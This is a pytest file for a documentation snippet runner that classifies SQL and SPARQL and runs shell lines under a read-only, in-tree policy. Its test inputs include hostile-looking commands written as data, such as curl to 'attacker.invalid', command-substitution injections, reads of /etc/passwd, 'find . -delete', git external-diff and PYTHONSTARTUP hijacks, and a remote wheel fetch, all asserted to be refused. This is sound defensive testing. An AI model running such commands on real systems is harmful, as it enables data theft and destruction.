"""The snippet runner's classification and its shell state (plan step 7, "Every snippet")."""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import snippets  # noqa: E402


def test_databricks_sql_is_not_sparql():
    assert snippets.kind_of({"lang": "", "text": "SELECT e.source, t.object\nFROM idp_sbx.tech_graph.edges e"}) == "sql"
    assert snippets.kind_of({"lang": "", "text": "SELECT a, MEASURE(b) AS m\nFROM v GROUP BY ALL"}) == "sql"
    assert snippets.kind_of({"lang": "", "text": "PREFIX x: <u>\nSELECT ?s WHERE { ?s a x:T }"}) == "sparql"
    assert snippets.kind_of({"lang": "", "text": "SELECT ?s WHERE { ?s ?p ?o }"}) == "sparql"


def test_a_from_comment_sets_the_folder_and_variables_carry_across_blocks():
    with tempfile.TemporaryDirectory() as tree:
        os.makedirs(os.path.join(tree, "a", "b"))
        with open(os.path.join(tree, "a", "b", "x.txt"), "w") as f:
            f.write("hi\n")
        state = {}
        r = snippets.run_shell("# from a/b\ncat x.txt", tree, {}, state)
        assert r["lines"][0]["ran"] and r["lines"][0]["returncode"] == 0 and "hi" in r["lines"][0]["tail"]
        r = snippets.run_shell("# from a\nls .\n# from a/b\ncat x.txt", tree, {}, state)
        assert [x["returncode"] for x in r["lines"]] == [0, 0] and "hi" in r["lines"][1]["tail"]
        r = snippets.run_shell("# from nowhere\nls .", tree, {}, state)  # the block stops: nothing runs in the wrong folder
        assert r["lines"][0] == {"line": "# from nowhere", "ran": False, "reason": "folder not in the tree", "failed_folder": True}
        assert r["lines"][1]["ran"] is False and "stopped" in r["lines"][1]["reason"] and r["failed"] == [r["lines"][0]] and r["stopped_at"] == "# from nowhere"
        r = snippets.run_shell("cd nowhere\nls .", tree, {}, state)
        assert r["lines"][1]["ran"] is False and r["failed"] == [r["lines"][0]]
        r = snippets.run_shell("cd nowhere\nls .", tree, {}, state, strict=False)  # a skill's example folder: listed, not failed
        assert r["lines"][1]["ran"] is False and r["failed"] == [] and r["stopped_at"] == "cd nowhere"
        r = snippets.run_shell("# from repository root\nls a", tree, {}, state)
        assert r["lines"][0]["ran"] and r["lines"][0]["returncode"] == 0 and "b" in r["lines"][0]["tail"]
        os.makedirs(os.path.join(tree, "skills", "s", "scripts"))
        r = snippets.run_shell('# from $SKILLS/s/scripts\nls .\ncd "$EPM/a"\nls .', tree, {}, state)  # the reader's variables are the tree's
        assert [x.get("returncode", x.get("ran")) for x in r["lines"]] == [0, True, 0] and "b" in r["lines"][2]["tail"]
        r = snippets.run_shell('DIR=' + os.path.join(tree, "a") + '; mkdir -p "$DIR"', tree, {}, state)
        assert state["vars"]["DIR"] == os.path.join(tree, "a") and not r["failed"]
        r = snippets.run_shell('ls "$DIR/b"', tree, {}, state)
        assert r["lines"][0]["ran"] and "x.txt" in r["lines"][0]["tail"]
        r = snippets.run_shell('ls "$OTHER"', tree, {}, state)
        assert r["lines"][0]["ran"] is False and "OTHER" in r["lines"][0]["reason"]


def test_every_document_in_the_tree_is_read_once():
    with tempfile.TemporaryDirectory() as tree:
        for rel in ("README.md", "README.html", "guide.html", "a/b.md", "scripts/docs_template.html", "skills/scripts/playbook_template.html", ".venv/x.md", "__pycache__/y.md", "c.txt"):
            os.makedirs(os.path.dirname(os.path.join(tree, rel)) or tree, exist_ok=True)
            with open(os.path.join(tree, rel), "w") as f:
                f.write("x")
        assert snippets.documents(tree) == ["README.md", "a/b.md", "guide.html"]


def test_the_test_neo4j_login_comes_from_env_or_the_store_rows_login_file():
    with tempfile.TemporaryDirectory() as d:
        assert snippets.neo4j_login({}) == ""
        assert snippets.neo4j_login({"IMPORT_DIR": d}) == ""
        with open(os.path.join(d, "validate-neo4j.env"), "w") as f:
            f.write("NEO4J_URI=bolt://localhost:17799\nNEO4J_PASSWORD=fromfile\n")
        assert snippets.neo4j_login({"IMPORT_DIR": d}) == "fromfile"
        assert snippets.neo4j_login({"IMPORT_DIR": d, "TEST_NEO4J_PASSWORD": "given"}) == "given"


def test_no_line_reaches_a_shell_and_the_environment_carries_no_login():
    with tempfile.TemporaryDirectory() as tree:
        with open(os.path.join(tree, "x.txt"), "w") as f:
            f.write("hi\n")
        state = {}
        for line in ("echo safe; id", "echo safe | cat", "ls $(id)", "ls `id`", "cat x.txt > out", "ls || id", "printf safe; curl https://attacker.invalid"):
            r = snippets.run_shell(line, tree, {}, state)
            assert r["lines"][0]["ran"] is False and "shell syntax" in r["lines"][0]["reason"] and r["failed"] == [], line
        assert not os.path.exists(os.path.join(tree, "out"))
        r = snippets.run_shell("cat x.txt && ls .", tree, {}, state)  # a && b runs b after a
        assert [x["returncode"] for x in r["lines"]] == [0, 0] and "hi" in r["lines"][0]["tail"] and "x.txt" in r["lines"][1]["tail"]
        os.environ["PLANTED_SECRET_TOKEN"] = "t0ken"
        try:
            with open(os.path.join(tree, "env.py"), "w") as f:
                f.write("import os\nprint(sorted(os.environ))\n")
            r = snippets.run_shell("python3 env.py --list", tree, {}, state)  # a script from the tree, --list on the read-only allowlist
        finally:
            del os.environ["PLANTED_SECRET_TOKEN"]
        assert r["lines"][0]["returncode"] == 0 and "PLANTED_SECRET_TOKEN" not in r["lines"][0]["tail"] and "'PATH'" in r["lines"][0]["tail"]
        r = snippets.run_shell('cat "x.txt"', tree, {}, state)  # quoting is honoured without a shell
        assert r["lines"][0]["returncode"] == 0


def test_a_folder_outside_the_tree_stops_the_block():
    with tempfile.TemporaryDirectory() as tree, tempfile.TemporaryDirectory() as outside:
        os.makedirs(os.path.join(tree, "a"))
        os.symlink(outside, os.path.join(tree, "link"))
        state = {}
        for line in (f"cd {outside}", "cd ..", "cd a/../..", "cd link", f"# from {outside}", "# from ../", "# from link"):
            r = snippets.run_shell(line + "\nls .", tree, {}, state)
            assert r["lines"][0]["ran"] is False and r["lines"][0].get("failed_folder") and r["lines"][1]["ran"] is False, line
        r = snippets.run_shell("cd a\ncd ..\nls a", tree, {}, state)  # back to the root is still inside
        assert [x.get("returncode", x.get("ran")) for x in r["lines"]] == [True, True, 0]


def test_a_sparql_fragment_in_a_reference_is_listed_not_run_but_fails_in_the_trees_own_documents(tmp_path):
    import pytest
    fragment = "CONSTRUCT { ?s ?p ?o } WHERE { ?s ?p ?o FILTER"
    r = snippets.run_sparql(fragment, str(tmp_path), "skills/ontology-to-lpg/references/pipeline.md")
    assert r["ran"] is False and "fragment" in r["reason"]
    r = snippets.run_sparql(fragment, str(tmp_path), "best-practices/guide.md")
    assert r["ran"] is False
    with pytest.raises(Exception):
        snippets.run_sparql(fragment, str(tmp_path), "business_architecture/ontology/README.md")


def test_only_the_command_policy_runs_and_every_operand_stays_in_the_tree():
    with tempfile.TemporaryDirectory() as tree:
        os.makedirs(os.path.join(tree, "a"))
        with open(os.path.join(tree, "a", "x.txt"), "w") as f:
            f.write("hi\n")
        with open(os.path.join(tree, "ask.py"), "w") as f:
            f.write("print('asked')\n")
        state = {}
        refused = ("cat /etc/hosts", "head -2 /etc/passwd", "grep foo /etc/passwd", "find / -name x", "find . -delete", "find . -exec rm {} +",
                   'python3 -c "print(1)" --list', "python3 /tmp/x.py --list", "uv run python -c 'print(1)' --list", "uv run python -m pricing_demo.x walk",
                   "rm -rf a", "bash scripts/check.sh", "curl -s https://attacker.invalid", "docker run -it x", "git push origin x", "ls --color=always a", "cat ../../etc/hosts")
        for line in refused:
            r = snippets.run_shell(line, tree, {}, state)
            assert r["lines"][0]["ran"] is False, (line, r["lines"][0])
        for line in ("cat /etc/hosts", "find . -delete", 'python3 -c "print(1)" --list', "cat ../../etc/hosts"):  # rm is refused earlier, as not read-only
            assert "policy" in snippets.run_shell(line, tree, {}, state)["lines"][0]["reason"], line
        for line in ("cat a/x.txt", "ls -la a", "grep -rn hi a", "head -1 a/x.txt", "find . -name '*.txt' -type f", "shasum -a 256 a/x.txt", "wc -l a/x.txt"):
            r = snippets.run_shell(line, tree, {}, state)
            assert r["lines"][0]["ran"] and r["lines"][0]["returncode"] == 0, (line, r["lines"][0])
        r = snippets.run_shell("python3 ask.py --list", tree, {}, state)  # a script from the tree
        assert r["lines"][0]["returncode"] == 0 and "asked" in r["lines"][0]["tail"]


def test_an_assignment_expands_only_the_blocks_own_variables():
    with tempfile.TemporaryDirectory() as tree:
        os.environ["DATABRICKS_TOKEN"] = "dapi-planted-secret"
        try:
            state = {}
            r = snippets.run_shell("X=$DATABRICKS_TOKEN\necho $X", tree, {}, state)
        finally:
            del os.environ["DATABRICKS_TOKEN"]
        assert state["vars"]["X"] == "$DATABRICKS_TOKEN"  # the host's value never enters the block
        assert r["lines"][1]["ran"] and r["lines"][1]["tail"].strip() == "$DATABRICKS_TOKEN"  # the name stays a name
        assert "dapi-planted-secret" not in str(r) and "dapi-planted-secret" not in str(state)
        r = snippets.run_shell("Y=$EPM/a\necho $Y", tree, {}, state)  # the reader's variables are the tree's
        assert r["lines"][1]["ran"] and r["lines"][1]["tail"].strip() == os.path.join(tree, "a")


def test_git_may_not_run_a_program_and_a_documents_variable_is_not_exported_under_a_tools_name():
    with tempfile.TemporaryDirectory() as tree:
        with open(os.path.join(tree, "env.py"), "w") as f:
            f.write("import os\nprint(sorted(os.environ))\n")
        state = {}
        for line in ("git diff --ext-diff", "git diff --textconv", "git log --no-pager", "git diff --output=/tmp/x", "git show --ext-diff HEAD"):
            r = snippets.run_shell(line, tree, {}, state)
            assert r["lines"][0]["ran"] is False and "policy" in r["lines"][0]["reason"], (line, r["lines"][0])
        for line in ("git -c core.pager=x log", "git --config-env=x log"):  # an option before the subcommand: refused as not read-only
            assert snippets.run_shell(line, tree, {}, state)["lines"][0]["ran"] is False, line
        evil = os.path.join(tree, "evil.sh")
        with open(evil, "w") as f:
            f.write("#!/bin/sh\necho EVIL-RAN > " + os.path.join(tree, "ran.txt") + "\n")
        os.chmod(evil, 0o755)
        r = snippets.run_shell(f"GIT_EXTERNAL_DIFF={evil}\nPYTHONSTARTUP={evil}\nUV_PYTHON={evil}\nPATH=/nowhere\nFOO=bar\npython3 env.py --list", tree, {}, state)
        names = r["lines"][-1]["tail"]
        assert r["lines"][-1]["returncode"] == 0 and "'FOO'" in names  # a plain variable is exported
        assert not any(n in names for n in ("GIT_EXTERNAL_DIFF", "PYTHONSTARTUP", "UV_PYTHON")) and "/nowhere" not in names  # a tool's name is not
        assert not os.path.exists(os.path.join(tree, "ran.txt"))


def test_uv_option_values_are_checked_like_operands():
    with tempfile.TemporaryDirectory() as tree, tempfile.TemporaryDirectory() as outside:
        with open(os.path.join(tree, "x.py"), "w") as f:
            f.write("print('ok')\n")
        state = {}
        for line in (f"uv run --python {outside}/python3 python x.py --list", "uv run --with ./pkg python x.py --list", "uv run --with https://evil.invalid/p.whl python x.py --list",
                     f"uv run --project {outside} python x.py --list", "uv run --project ../x python x.py --list", "uv run --group ../g python x.py --list", "uv run --with /tmp/x python x.py --list"):
            r = snippets.run_shell(line, tree, {}, state)
            assert r["lines"][0]["ran"] is False and "policy" in r["lines"][0]["reason"], (line, r["lines"][0])
        import shlex
        for line in ("uv run --with rdflib --with pyshacl>=0.25 --python 3.12 --group graph python x.py --list", "uv run --with markdown-it-py>=4,<5 python x.py --list"):
            assert snippets.policy(shlex.split(line), tree, tree) is None, line


def test_a_tilde_is_not_expanded_where_it_would_be_printed():
    with tempfile.TemporaryDirectory() as tree:
        state = {}
        r = snippets.run_shell("echo ~\nprintf ~/x", tree, {}, state)
        assert r["lines"][0]["tail"].strip() == "~" and r["lines"][1]["tail"].strip() == "~/x" and os.path.expanduser("~") not in str(r)
        for line in ("cat ~/.profile", "cd ~", "# from ~\nls ."):
            r = snippets.run_shell(line, tree, {}, state)
            assert r["lines"][0]["ran"] is False, (line, r["lines"][0])  # a path operand with ~ resolves outside the tree and is refused


def test_a_complete_query_with_trailing_text_in_a_reference_is_listed_with_the_parsers_position():
    import pytest
    pytest.importorskip("rdflib")
    with tempfile.TemporaryDirectory() as tree:
        text = "SELECT ?s WHERE { ?s ?p ?o } and then some words that are not SPARQL"
        r = snippets.run_sparql(text, tree, "skills/ontology/references/x.md")
        assert r["ran"] is False and "did not parse" in r["reason"] and ("lineno" in r["reason"] or "position" in r["reason"] or "col" in r["reason"])
        with pytest.raises(Exception):
            snippets.run_sparql(text, tree, "business_architecture/ontology/README.md")  # the tree's own document: a failure
